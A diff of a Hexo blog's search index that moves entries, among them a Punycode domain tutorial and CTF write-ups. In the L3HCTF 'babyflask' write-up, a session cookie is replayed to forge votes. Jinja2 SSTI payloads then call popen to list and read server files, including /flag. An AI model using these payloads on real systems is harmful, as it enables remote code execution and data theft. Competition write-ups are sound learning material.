@@ -1843,6 +1843,39 @@ def signup_post():
       </tags>
   </entry>
   <entry>
+    <title>Hexo+Github pages博客绑定中文域名</title>
+    <url>/posts/24787/</url>
+    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>近期又开始了hexo的折腾，在阿里云上买了一个属于自己的域名，因此想着把自己用hexo+Github搭建的博客通过域名访问，于是按照百度上的教程一步一步来绑定域名，结果出现了很多问题 。整个过程可谓一波三折，终于实现了通过域名来访问博客，下面简要介绍一下我绑定域名过程中遇到的问题以及解决方案。</p>
+<span id="more"></span>
+<h2 id="购买域名"><a href="#购买域名" class="headerlink" title="购买域名"></a>购买域名</h2><p>这里以在<a href="https://www.aliyun.com/">阿里云</a>上购买域名为例,大家也可以去其他平台购买域名。<br>登录阿里云，点击<strong>产品</strong>，选择<strong>域名注册</strong>。<br>注册域名前需查询域名是否已被注册，选择自己喜欢的域名，支付即可。<br><img data-src="/images/20180213014855.jpg"><br>一般来说，.top与.xyz结尾的域名都比较便宜。为了节约成本，我买的.top结尾的域名，一年只需两块钱，很便宜。</p>
+<h2 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h2><p>购买域名后，我们依次点击个人昵称-&gt;域名与网站(万网)-&gt;域名，进入管理控制台，在这里我们可以看到自己购买的域名,点击<strong>解析</strong>，进入解析设置。<br><img data-src="/images/20180212235815.jpg"><br>点击添加解析，依次输入：<strong>CNAME、@、Github博客地址</strong>，点击<strong>确定</strong>，完成个人域名向个人博客的映射。<br><img data-src="/images/20180212230359.jpg"></p>
+<div class="note warning"><p>注意：这里填入博客地址的时候无需填写https:// ，只需按照example.github.io格式填写就行了。
+</p></div>
+
+<h2 id="创建CNAME文件"><a href="#创建CNAME文件" class="headerlink" title="创建CNAME文件"></a>创建CNAME文件</h2><p>在本地的根目录下的source文件夹中新建一个名为<strong>CNAME</strong>的文本文件，文件内容为<strong>个人域名</strong>（没有http:&#x2F;&#x2F; ,也没有www.）,然后重命名删除该文件的后缀名:<strong>.txt</strong>。<br>使用<code>hexo d -g</code>命令部署博客，这时在浏览器中输入新注册的域名，已经可以正常的访问博客了。</p>
+<h3 id="英文域名"><a href="#英文域名" class="headerlink" title="英文域名"></a>英文域名</h3><p>英文域名就直接写:<code>example.con</code></p>
+<h3 id="中文域名"><a href="#中文域名" class="headerlink" title="中文域名"></a>中文域名</h3><p>中文域名的话,则需先将中文域名转换为<strong>Punycode标准编码的字符串</strong>:<a href="http://www.dh.vg/tools/zm.php">中文域名转换Punycode标准编码工具</a><br>For example:<br><code>例子.中文</code>经过转换为<code>xn--fsqu00a.xn--fiq228c</code><br>将<code>xn--****.xn--***</code>填入<strong>CNAME</strong>文件即可。</p>
+<div class="note danger"><p>如果直接在CNAME文件中填写中文域名,则Github会通过邮件提醒你:
+The CNAME xxx.com is not properly formatted. See https://help.github.com/articles/troubleshooting-custom-domains/#github-repository-setup-errors for more information.
+</p></div>
+## LeanCloud数据丢失
+通过域名访问博客，发现文章的阅读次数不显示，于是各种折腾：检查元素、谷歌，最后发现是由于没有将新注册的域名加入到LeanCloud设置中的**Web 安全域名**,导致无法调用服务器资源。
+解决方案：访问：[LeanCloud官网](https://leancloud.cn),进入**控制台**，在设置中点击**安全中心**，将新注册的域名加入到**Web安全域名**中，点击**保存**即可。
+![](/images/20180213013700.jpg)
+
+<h2 id="busuanzi数据丢失"><a href="#busuanzi数据丢失" class="headerlink" title="busuanzi数据丢失"></a>busuanzi数据丢失</h2><p>无论是通过域名还是github地址访问博客，博客底部的统计浏览量与浏览人次均不是以前的数据，而是从头开始计算....<br>busuanzi还不具备统初始值的功能，只能从头开始计算了。。。</p>
+<h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><h3 id="中文域名-1"><a href="#中文域名-1" class="headerlink" title="中文域名"></a>中文域名</h3><p>１、一类是域名后缀为英文字母的国际中文域名和别国中文域名，比如：中文.com，中文.net，中文.biz，中文.cc，中文.hk，中文.tm，中文.tv，中文.tw；<br>２、一类是域名后缀为中文的纯中文国内中文域名，比如：中文域名.中国，中文域名.公司，中文域名.网络；<br>中文域名在解析的时候，需要先转换为 xn--fiq228c.com或xn--fiq228c.cn形式的ASCII码，这种编码称为PunyCode。纯中文域名不被标准的解析服务器支持，要实现对这种纯中文域名的正确访问，ISP需要做相应的修改，以便能够正确解析中文域名。同时CNNIC也提供了专用服务器，用户只要将浏览器的DNS设置指向这台服务器，它同样可以完成对纯中文域名的正确解析。另外，考虑到现在有些ISP还没有做修改，而有些用户又不方便将DNS设置指向CNNIC提供的服务器，纯中文域名会被加上.cn后缀，即对每一个纯中文域名同时有两种形式：纯中文域名和纯中文域名.CN， 如：&quot;中文域名.网络&quot;和&quot;中文域名.网络.CN&quot;。这样即使ISP还没有做相应的修改，用户也可以正确使用中文域名。</p>
+<h3 id="PunyCode"><a href="#PunyCode" class="headerlink" title="PunyCode"></a>PunyCode</h3><p>英文域名在IIS或Apache中的虚拟主机设置，可以直接使用英文域名，如webmasterhome.cn。<br>中文域名在IIS或Apache中应如何设置主机头呢？如&quot;中国站长之家.com&quot;。<br>1、在进行设置之前要先把中文域名转化成为PunyCode编码，然后在主机头设置里面填上中文域名所对应的PunyCode编码(｀xn--fiqsC146Ah4ex80Cro7A.com｀)便可。<br>新的国际化域名的标准在网域名称编码上，为了保留向下兼容性及不影响现有的应用程序协议，因此将多国语言域名转成ASCII编码，而这种编码称为『punycode』。<br>因为经过Nameprep处理过的国际化域名是以 Unicode 序列的形式表示的。但现有的 DNS系统只支持用 ASCII字符表示的域名，所以要对Unicode序列进行 ACE(ASCII-compatible encoding)编码，把 Unicode序列表示的域名转换成 ASCII 字符串表示的ACE域名。<br>2、PunyCode是一种专为国际化域名而设计的高效ACE编码方式。它可以在Unicode序列和ASCII 字符串之间进行唯一的和可逆的转换。转换的过程中，Unicode 序列中的ASCII字符保持不变，国际化字符则用字母和数字来表示。它的实质是一种用数量有限的基本字符(字母和数字)来唯一地表示大字符集(Unicode)中的字符的通用算法。域名中的字符，包括 ASCII 码和 Unicode 码，都是作为整数进行处理。<br>PunyCode则是将一个经过Nameprep处理过的IDN，从一个8位的编码的形式转换为7位编码的形式。目前Internet DNS一向是7位ASCII编码的环境，经过这个PunyCode转码程序，便将IDN从一个8位的IDN转换为与现有DNS环境兼容的编码。<br>3、在DNS服务器方面，需要将IDN以PunyCode的编码形式来设定。因为PunyCode本身就是一种7位的编码，与ASCII编码完全兼容，所以可适用设定于目前所有可用的DNS版本,也就是说可以不需要为了设定PunyCode而重新安装BIND新版本。但是若是需要使用DNAME指令来设定资源记录(Resource Record)，则需先提升为BIND9的版本。</p>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
+      <categories>
+        <category>Hexo</category>
+      </categories>
+      <tags>
+        <tag>Hexo</tag>
+        <tag>Github</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>K3RN3LCTF2021 Writeup</title>
     <url>/posts/3427623925/</url>
     <content><![CDATA[<h1 id="3in1"><a href="#3in1" class="headerlink" title="3in1"></a>3in1</h1><p><em>Description</em><br><em>Like Nescafeeeee!</em></p>
@@ -1953,39 +1986,6 @@ conn.interactive()
       <tags>
         <tag>CTF</tag>
         <tag>K3RN3LCTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Hexo+Github pages博客绑定中文域名</title>
-    <url>/posts/24787/</url>
-    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>近期又开始了hexo的折腾，在阿里云上买了一个属于自己的域名，因此想着把自己用hexo+Github搭建的博客通过域名访问，于是按照百度上的教程一步一步来绑定域名，结果出现了很多问题 。整个过程可谓一波三折，终于实现了通过域名来访问博客，下面简要介绍一下我绑定域名过程中遇到的问题以及解决方案。</p>
-<span id="more"></span>
-<h2 id="购买域名"><a href="#购买域名" class="headerlink" title="购买域名"></a>购买域名</h2><p>这里以在<a href="https://www.aliyun.com/">阿里云</a>上购买域名为例,大家也可以去其他平台购买域名。<br>登录阿里云，点击<strong>产品</strong>，选择<strong>域名注册</strong>。<br>注册域名前需查询域名是否已被注册，选择自己喜欢的域名，支付即可。<br><img data-src="/images/20180213014855.jpg"><br>一般来说，.top与.xyz结尾的域名都比较便宜。为了节约成本，我买的.top结尾的域名，一年只需两块钱，很便宜。</p>
-<h2 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h2><p>购买域名后，我们依次点击个人昵称-&gt;域名与网站(万网)-&gt;域名，进入管理控制台，在这里我们可以看到自己购买的域名,点击<strong>解析</strong>，进入解析设置。<br><img data-src="/images/20180212235815.jpg"><br>点击添加解析，依次输入：<strong>CNAME、@、Github博客地址</strong>，点击<strong>确定</strong>，完成个人域名向个人博客的映射。<br><img data-src="/images/20180212230359.jpg"></p>
-<div class="note warning"><p>注意：这里填入博客地址的时候无需填写https:// ，只需按照example.github.io格式填写就行了。
-</p></div>
-
-<h2 id="创建CNAME文件"><a href="#创建CNAME文件" class="headerlink" title="创建CNAME文件"></a>创建CNAME文件</h2><p>在本地的根目录下的source文件夹中新建一个名为<strong>CNAME</strong>的文本文件，文件内容为<strong>个人域名</strong>（没有http:&#x2F;&#x2F; ,也没有www.）,然后重命名删除该文件的后缀名:<strong>.txt</strong>。<br>使用<code>hexo d -g</code>命令部署博客，这时在浏览器中输入新注册的域名，已经可以正常的访问博客了。</p>
-<h3 id="英文域名"><a href="#英文域名" class="headerlink" title="英文域名"></a>英文域名</h3><p>英文域名就直接写:<code>example.con</code></p>
-<h3 id="中文域名"><a href="#中文域名" class="headerlink" title="中文域名"></a>中文域名</h3><p>中文域名的话,则需先将中文域名转换为<strong>Punycode标准编码的字符串</strong>:<a href="http://www.dh.vg/tools/zm.php">中文域名转换Punycode标准编码工具</a><br>For example:<br><code>例子.中文</code>经过转换为<code>xn--fsqu00a.xn--fiq228c</code><br>将<code>xn--****.xn--***</code>填入<strong>CNAME</strong>文件即可。</p>
-<div class="note danger"><p>如果直接在CNAME文件中填写中文域名,则Github会通过邮件提醒你:
-The CNAME xxx.com is not properly formatted. See https://help.github.com/articles/troubleshooting-custom-domains/#github-repository-setup-errors for more information.
-</p></div>
-## LeanCloud数据丢失
-通过域名访问博客，发现文章的阅读次数不显示，于是各种折腾：检查元素、谷歌，最后发现是由于没有将新注册的域名加入到LeanCloud设置中的**Web 安全域名**,导致无法调用服务器资源。
-解决方案：访问：[LeanCloud官网](https://leancloud.cn),进入**控制台**，在设置中点击**安全中心**，将新注册的域名加入到**Web安全域名**中，点击**保存**即可。
-![](/images/20180213013700.jpg)
-
-<h2 id="busuanzi数据丢失"><a href="#busuanzi数据丢失" class="headerlink" title="busuanzi数据丢失"></a>busuanzi数据丢失</h2><p>无论是通过域名还是github地址访问博客，博客底部的统计浏览量与浏览人次均不是以前的数据，而是从头开始计算....<br>busuanzi还不具备统初始值的功能，只能从头开始计算了。。。</p>
-<h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><h3 id="中文域名-1"><a href="#中文域名-1" class="headerlink" title="中文域名"></a>中文域名</h3><p>１、一类是域名后缀为英文字母的国际中文域名和别国中文域名，比如：中文.com，中文.net，中文.biz，中文.cc，中文.hk，中文.tm，中文.tv，中文.tw；<br>２、一类是域名后缀为中文的纯中文国内中文域名，比如：中文域名.中国，中文域名.公司，中文域名.网络；<br>中文域名在解析的时候，需要先转换为 xn--fiq228c.com或xn--fiq228c.cn形式的ASCII码，这种编码称为PunyCode。纯中文域名不被标准的解析服务器支持，要实现对这种纯中文域名的正确访问，ISP需要做相应的修改，以便能够正确解析中文域名。同时CNNIC也提供了专用服务器，用户只要将浏览器的DNS设置指向这台服务器，它同样可以完成对纯中文域名的正确解析。另外，考虑到现在有些ISP还没有做修改，而有些用户又不方便将DNS设置指向CNNIC提供的服务器，纯中文域名会被加上.cn后缀，即对每一个纯中文域名同时有两种形式：纯中文域名和纯中文域名.CN， 如：&quot;中文域名.网络&quot;和&quot;中文域名.网络.CN&quot;。这样即使ISP还没有做相应的修改，用户也可以正确使用中文域名。</p>
-<h3 id="PunyCode"><a href="#PunyCode" class="headerlink" title="PunyCode"></a>PunyCode</h3><p>英文域名在IIS或Apache中的虚拟主机设置，可以直接使用英文域名，如webmasterhome.cn。<br>中文域名在IIS或Apache中应如何设置主机头呢？如&quot;中国站长之家.com&quot;。<br>1、在进行设置之前要先把中文域名转化成为PunyCode编码，然后在主机头设置里面填上中文域名所对应的PunyCode编码(｀xn--fiqsC146Ah4ex80Cro7A.com｀)便可。<br>新的国际化域名的标准在网域名称编码上，为了保留向下兼容性及不影响现有的应用程序协议，因此将多国语言域名转成ASCII编码，而这种编码称为『punycode』。<br>因为经过Nameprep处理过的国际化域名是以 Unicode 序列的形式表示的。但现有的 DNS系统只支持用 ASCII字符表示的域名，所以要对Unicode序列进行 ACE(ASCII-compatible encoding)编码，把 Unicode序列表示的域名转换成 ASCII 字符串表示的ACE域名。<br>2、PunyCode是一种专为国际化域名而设计的高效ACE编码方式。它可以在Unicode序列和ASCII 字符串之间进行唯一的和可逆的转换。转换的过程中，Unicode 序列中的ASCII字符保持不变，国际化字符则用字母和数字来表示。它的实质是一种用数量有限的基本字符(字母和数字)来唯一地表示大字符集(Unicode)中的字符的通用算法。域名中的字符，包括 ASCII 码和 Unicode 码，都是作为整数进行处理。<br>PunyCode则是将一个经过Nameprep处理过的IDN，从一个8位的编码的形式转换为7位编码的形式。目前Internet DNS一向是7位ASCII编码的环境，经过这个PunyCode转码程序，便将IDN从一个8位的IDN转换为与现有DNS环境兼容的编码。<br>3、在DNS服务器方面，需要将IDN以PunyCode的编码形式来设定。因为PunyCode本身就是一种7位的编码，与ASCII编码完全兼容，所以可适用设定于目前所有可用的DNS版本,也就是说可以不需要为了设定PunyCode而重新安装BIND新版本。但是若是需要使用DNAME指令来设定资源记录(Resource Record)，则需先提升为BIND9的版本。</p>
-<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
-      <categories>
-        <category>Hexo</category>
-      </categories>
-      <tags>
-        <tag>Hexo</tag>
-        <tag>Github</tag>
       </tags>
   </entry>
   <entry>
@@ -2331,62 +2331,6 @@ ken@163.com 70
       </tags>
   </entry>
   <entry>
-    <title>L3HCTF2021-个人能力认证 Writeup</title>
-    <url>/posts/98571386/</url>
-    <content><![CDATA[<h1 id="babyflask"><a href="#babyflask" class="headerlink" title="babyflask"></a>babyflask</h1><p><em><a href="http://123.60.19.253:10001/">http://123.60.19.253:10001</a></em></p>
-<hr>
-<p>分析给出的源文件,发现<code>/success</code>路由下的<code>name</code>存在SSTI漏洞.</p>
-<p>继续分析,<code>name</code>取自<code>session[&#39;name&#39;]</code>,用户登录时会自动创新用户和删除前一个同名用户的登录信息,那其实我们用注入的代码的作为用户名直接登录即可.</p>
-<pre><code class="python">template =  &#39;&#39;&#39;
-Congratulations, %s. You can get flag now!
-&#39;&#39;&#39; % name
-return render_template_string(template)
-</code></pre>
-<p>要想执行到上述代码,需要给flag投满8票(我们手里只有5票),注意到vote是存储在session中,<code>/vote</code>接口会校验<code>session</code>中保存的vote数量并减一,猜测这里可能存在session会话劫持.</p>
-<p>我们第一次登录时复制一下当前的<code>session</code>,然后给flag投票,等手里的票用光之后,再把第一次登录时复制的<code>seesion</code>粘贴进浏览器保存的Cookie中,我们的票又回来了.</p>
-<blockquote>
-<p>🤠登录后疯狂点击“投票”,也能投满8票;可能因为Server响应太慢,浏览器中保存的session还没来得及被更新,导致多个请求发起时共用一个session(即vote数量相等),session中保存的vote最终只会减一.</p>
-</blockquote>
-<img data-src="../../CTF/L3HCTF2021-个人能力认证/Web/images/0.jpg" alt="image-20211114190032492" style="zoom:50%;" />
-
-<p>使用如下代码作为用户名登录,查看一下当前已加载模块</p>
-<pre><code class="python">&#123;&#123;''.__class__.__bases__[0].__subclasses__()&#125;&#125;
-</code></pre>
-<img data-src="../../CTF/L3HCTF2021-个人能力认证/Web/images/1.jpg" alt="image-20211114182131940" style="zoom:50%;" />
-
-<p>人肉计数&#x2F;写个脚本,找到<code>os._wrap_close</code>模块所在的索引,借助于<code>popen</code>函数可以直接执行系统命令</p>
-<pre><code class="python">num = 0
-for i in a.split(&#39;, &#39;):
-    if &#39;os._wrap_close&#39; in i:
-        print(num)
-    num += 1
-</code></pre>
-<p>先<code>ls -a</code>一下,发现<code>config.py</code></p>
-<pre><code class="python">&#123;&#123;''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('ls -a').read()&#125;&#125;
-</code></pre>
-<p><img data-src="/../../CTF/L3HCTF2021-%E4%B8%AA%E4%BA%BA%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/Web/images/2.png" alt="image-20211114183143814"><br>继续<code>cat</code>,没有在<code>config.py</code>中找到flag</p>
-<pre><code class="python">&#123;&#123;''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('cat config.py').read()&#125;&#125;
-</code></pre>
-<p><img data-src="/../../CTF/L3HCTF2021-%E4%B8%AA%E4%BA%BA%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/Web/images/3.png" alt="image-20211114183703433"></p>
-<p>用<code>ls -R /</code>找找,发现存在<code>/flag</code>文件</p>
-<pre><code class="python">&#123;&#123;''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('ls -R /').read()&#125;&#125;
-</code></pre>
-<p><img data-src="/../../CTF/L3HCTF2021-%E4%B8%AA%E4%BA%BA%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/Web/images/4.jpg" alt="image-20211114183857713"><br>直接<code>cat /flag</code>即可</p>
-<pre><code class="python">&#123;&#123;''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()&#125;&#125;
-</code></pre>
-<p><img data-src="/../../CTF/L3HCTF2021-%E4%B8%AA%E4%BA%BA%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/Web/images/5.png" alt="image-20211114184236370"></p>
-<p><strong>flag:</strong><code>l3hsec&#123;emmMmMM_mm~mMMmm~~T&#125;</code></p>
-<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>L3HCTF</tag>
-        <tag>个人能力认证</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>PBjarCTF2021 Writeup</title>
     <url>/posts/2720124286/</url>
     <content><![CDATA[<h1 id="Convert"><a href="#Convert" class="headerlink" title="Convert"></a>Convert</h1><p><em>So this is supposed to be the challenge for absolute beginners. For this chall, you will get a hexadecimal number, and have to convert it to text. If you don&#39;t know how to do this, Google is your best friend!!!</em></p>
@@ -2592,94 +2536,59 @@ if(isset($_POST[&quot;notewrite&quot;]))
       </tags>
   </entry>
   <entry>
-    <title>TFCCTF2021 Writeup</title>
-    <url>/posts/501486646/</url>
-    <content><![CDATA[<h1 id="SEA-LANGUAGE-1"><a href="#SEA-LANGUAGE-1" class="headerlink" title="SEA LANGUAGE 1"></a>SEA LANGUAGE 1</h1><p><em>Quick! Help! We are sinking!</em></p>
-<p><em>Wrap the result in TFCCTF{}</em></p>
+    <title>L3HCTF2021-个人能力认证 Writeup</title>
+    <url>/posts/98571386/</url>
+    <content><![CDATA[<h1 id="babyflask"><a href="#babyflask" class="headerlink" title="babyflask"></a>babyflask</h1><p><em><a href="http://123.60.19.253:10001/">http://123.60.19.253:10001</a></em></p>
 <hr>
-<p>看着像摩斯码,直接在<a href="https://gchq.github.io/CyberChef/#recipe=From_Morse_Code('Space','Line%20feed')&input=Li0tIC4uLi4gLi4uLi0gLSAtLi4uLi0gLi0gLi0uIC4uLi0tIC0uLi4uLSAtLi0tIC0tLS0tIC4uLSAtLi4uLi0gLi4uIC4tLS0tIC0uIC0uLSAuLS0tLSAtLiAtLS4gLS4uLi4tIC4tIC0uLi4gLS0tLS0gLi4tIC0gLi4tLS4uIC0uLS4tLSAtLi0uLS0gLS4tLi0tIC4uLS0uLgo">gchq.github.io</a>上解密</p>
-<p><img data-src="/../../CTF/TFCCTF2021/Crypto/images/image-20211202204916391.png" alt="image-20211202204916391"></p>
-<p><strong>flag:</strong><code>TFCCTF&#123;WH4T-AR3-Y0U-S1NK1NG-AB0UT?!!!?&#125;</code></p>
-<h1 id="SEA-LANGUAGE-2"><a href="#SEA-LANGUAGE-2" class="headerlink" title="SEA LANGUAGE? 2"></a>SEA LANGUAGE? 2</h1><p><em>That&#39;s just another way to......</em></p>
-<hr>
-<p>题目给的数据8个字符为一组,猜测可能是二进制,在<a href="https://gchq.github.io/CyberChef/#recipe=Find_/_Replace(%7B'option':'Simple%20string','string':'.'%7D,'0',true,false,true,false)Find_/_Replace(%7B'option':'Simple%20string','string':'_'%7D,'1',true,false,true,false)From_Binary('Space',8)&input=Ll8uXy5fLi4gLl8uLi5fXy4gLl8uLi4uX18gLl8uLi4uX18gLl8uXy5fLi4gLl8uLi5fXy4gLl9fX18uX18gLl9fXy5fX18gLi5fXy5fLi4KIC4uX18uLi5fIC4uX18uX19fIC5fLl9fX19fIC4uX18uXy4uIC5fLl9fX19fIC5fXy5fXy5fIC4uX18uLi5fIC5fXy5fX18uIC5fX18uXy5fCiAuLl9fLl9fXyAuLl9fLi5fXyAuLl8uX19fLiAuLl8uX19fLiAuLl8uX19fLiAuXy5fX19fXyAuLl9fLl9fXyAuX18uXy4uLiAuLl9fLi4uXwogLi5fXy5fLl8gLl8uX19fX18gLi5fXy4uLl8gLl9fXy4uX18gLl8uX19fX18gLl9fLl9fXy4gLi5fXy4uLi4gLi5fXy5fX18gLl8uX19fX18KIC5fXy5fXy5fIC4uX18uLi4uIC5fX18uLl8uIC5fX18uLl9fIC4uX18uLl9fIC4uXy4uLi5fIC4uXy4uLi5fIC4uXy4uLi5fIC4uXy4uLi5fCiAuLl8uLi4uXyAuX19fLi5fLiAuLl9fLi4uXyAuX18uLl9fXyAuX18uXy4uLiAuLl9fLl9fXyAuLl9fX19fXyAuX19fX18uXwo">gchq.github.io</a>将<code>.</code>替换为<code>0</code>,<code>_</code>替换为<code>1</code>,然后二进制转字符串</p>
-<p><img data-src="/../../CTF/TFCCTF2021/Crypto/images/image-20211202205304755.png" alt="image-20211202205739848"></p>
-<p><strong>flag:</strong><code>TFCCTF&#123;w417_4_m1nu73..._7h15_1s_n07_m0rs3!!!!!r1gh7?&#125;</code></p>
-<h1 id="AAAAA"><a href="#AAAAA" class="headerlink" title="AAAAA"></a>AAAAA</h1><p><em>AAAAA. That&#39;s all</em></p>
-<hr>
-<p>首先用<code>exiftool</code>分析,提示文件前2000个字节都是A</p>
-<pre><code class="shell">~$ exiftool AAAAA
-ExifTool Version Number         : 12.31
-File Name                       : AAAAA
-Directory                       : .
-File Size                       : 157 KiB
-File Modification Date/Time     : 2021:11:27 00:33:54+08:00
-File Access Date/Time           : 2021:11:27 00:35:25+08:00
-File Inode Change Date/Time     : 2021:11:27 00:34:19+08:00
-File Permissions                : -rw-r--r--
-Error                           : First 2000 bytes of file is ASCII &#39;A&#39; characters
+<p>分析给出的源文件,发现<code>/success</code>路由下的<code>name</code>存在SSTI漏洞.</p>
+<p>继续分析,<code>name</code>取自<code>session[&#39;name&#39;]</code>,用户登录时会自动创新用户和删除前一个同名用户的登录信息,那其实我们用注入的代码的作为用户名直接登录即可.</p>
+<pre><code class="python">template =  &#39;&#39;&#39;
+Congratulations, %s. You can get flag now!
+&#39;&#39;&#39; % name
+return render_template_string(template)
 </code></pre>
-<p><code>hexdump -C AAAAA   </code>发现文件末尾的字节也有很多A,并且文件应该是一张PNG格式的图片</p>
-<pre><code class="shell">~$ hexdump -C AAAAA | head
-00000000  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
-*
-000007d0  89 50 4e 47 0d 0a 1a 0a  00 00 00 0d 49 48 44 52  |.PNG........IHDR|
-000007e0  00 00 07 62 00 00 05 89  08 02 00 00 00 23 47 40  |...b.........#G@|
-000007f0  3c 00 00 00 09 70 48 59  73 00 00 2e 23 00 00 2e  |&lt;....pHYs...#...|
-00000800  23 01 78 a5 3f 76 00 02  65 2b 49 44 41 54 78 9c  |#.x.?v..e+IDATx.|
-00000810  ec bd 67 7b 1a cb da b4  dd 83 10 39 83 50 b6 bd  |..g&#123;.......9.P..|
-00000820  c2 de ff ff df dc ef 5e  6b d9 96 ad 48 ce 39 cc  |.......^k...H.9.|
-00000830  fb a1 9e a9 e3 12 b2 bd  1c 24 10 50 e7 07 1d 08  |.........$.P....|
-00000840  21 18 26 f4 74 57 57 d7  e5 f9 be ef 84 10 42 08  |!.&amp;.tWW.......B.|
+<p>要想执行到上述代码,需要给flag投满8票(我们手里只有5票),注意到vote是存储在session中,<code>/vote</code>接口会校验<code>session</code>中保存的vote数量并减一,猜测这里可能存在session会话劫持.</p>
+<p>我们第一次登录时复制一下当前的<code>session</code>,然后给flag投票,等手里的票用光之后,再把第一次登录时复制的<code>seesion</code>粘贴进浏览器保存的Cookie中,我们的票又回来了.</p>
+<blockquote>
+<p>🤠登录后疯狂点击“投票”,也能投满8票;可能因为Server响应太慢,浏览器中保存的session还没来得及被更新,导致多个请求发起时共用一个session(即vote数量相等),session中保存的vote最终只会减一.</p>
+</blockquote>
+<img data-src="../../CTF/L3HCTF2021-个人能力认证/Web/images/0.jpg" alt="image-20211114190032492" style="zoom:50%;" />
 
-~$ hexdump -C AAAAA | tail  
-00026cf0  00 00 88 26 13 03 00 00  00 00 44 93 89 01 00 00  |...&amp;......D.....|
-00026d00  00 00 a2 c9 c4 00 00 00  00 00 d1 64 62 00 00 00  |...........db...|
-00026d10  00 80 68 32 31 00 00 00  00 40 34 99 18 00 00 00  |..h21....@4.....|
-00026d20  00 20 9a 4c 0c 00 00 00  00 10 4d 26 06 00 00 00  |. .L......M&amp;....|
-00026d30  00 88 f6 7f 00 7a e5 96  20 a3 a9 bd a4 00 00 00  |.....z.. .......|
-00026d40  00 49 45 4e 44 ae 42 60  82 41 41 41 41 41 41 41  |.IEND.B`.AAAAAAA|
-00026d50  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
-*
-00027510  41 41 41 41 41 41 41 41  41                       |AAAAAAAAA|
-00027519
+<p>使用如下代码作为用户名登录,查看一下当前已加载模块</p>
+<pre><code class="python">&#123;&#123;''.__class__.__bases__[0].__subclasses__()&#125;&#125;
 </code></pre>
-<p>去除文件首位的<code>A</code>即可,代码:</p>
-<pre><code class="python">from pathlib import  Path
-p = Path(&#39;AAAAA&#39;)
-data = p.read_bytes()
-data = data.strip(b&#39;A&#39;)
-Path(&#39;a.png&#39;).write_bytes(data)
-</code></pre>
-<p><img data-src="/../../CTF/TFCCTF2021/Forensics/images/AAAAA.png" alt="AAAAA.png"></p>
-<p><strong>flag:</strong><code>TFCCTF&#123;Gr4phic_d35ign_is_my_p455ion&#125;</code></p>
-<h1 id="DISCORD-SHENANIGANS"><a href="#DISCORD-SHENANIGANS" class="headerlink" title="DISCORD SHENANIGANS"></a>DISCORD SHENANIGANS</h1><p><em>We considered giving you a free flag. However, we decided against it. In general, we would never do that! Or would we? That&#39;s the beginning of a good CTF! Discord is the new Twitter.</em></p>
-<p><em>To be able to solve this challenge, you&#39;ll need to join our discord. Link in the Rules page.</em></p>
-<hr>
-<p>翻阅比赛官方的Discord,发现<code>#general</code>频道有一条特别奇怪的消息</p>
-<p><img data-src="/../../CTF/TFCCTF2021/Misc/images/image-20211203203451799.png" alt="image-20211203203451799"></p>
-<p>使用<a href="https://holloway.nz/steg/">Twitter Secret Messages</a>解密即可</p>
-<p><img data-src="/../../CTF/TFCCTF2021/Misc/images/image-20211202215347694.png" alt="image-20211202215347694"></p>
-<p><strong>flag:</strong><code>TFCCTF&#123;th1s_5t3g0_fl4g_w45_n0t_h1dden_w3ll&#125;</code></p>
-<h1 id="PRETTY-GOOD-PHISHER"><a href="#PRETTY-GOOD-PHISHER" class="headerlink" title="PRETTY GOOD PHISHER"></a>PRETTY GOOD PHISHER</h1><p><em>This phisher thinks he&#39;s the game! We got his PGP Key ID from his phishing e-mail, and we know for sure that he has another PGP key publicized under his real name! Can you find out more about him?</em></p>
-<p><em>A2DCB36111E3656B</em></p>
-<hr>
-<p>题目给了一个人的PGP密钥ID,要求我们找到他另一个以真名公开的PGP密钥</p>
-<p>在<a href="https://keyserver.pgp.com/vkd/SubmitSearch.event?SearchCriteria=A2DCB36111E3656B&EmailOrName=3&SearchType=0">https://keyserver.pgp.com/</a>上检索,得到邮箱<code>tdgd11fd8@gmail.com</code></p>
-<p><img data-src="/../../CTF/TFCCTF2021/Misc/images/image-20211203195242066.png" alt="image-20211203195242066"></p>
-<p>在<a href="https://tools.epieos.com/email.php">OSINT Tool</a>上搜索该邮箱,得到用户名是<code>Theobald Dannie Gyles</code></p>
-<img data-src="../../CTF/TFCCTF2021/Misc/images/image-20211203200112827.png" alt="image-20211203200112827" style="zoom:50%;" />
+<img data-src="../../CTF/L3HCTF2021-个人能力认证/Web/images/1.jpg" alt="image-20211114182131940" style="zoom:50%;" />
 
-<p>在<a href="https://keyserver.pgp.com/vkd/SubmitSearch.event">https://keyserver.pgp.com/</a>上搜索包含该用户名的PGP密钥,即可得到flag</p>
-<p><img data-src="/../../CTF/TFCCTF2021/Misc/images/image-20211203201556442.png" alt="image-20211203201556442"></p>
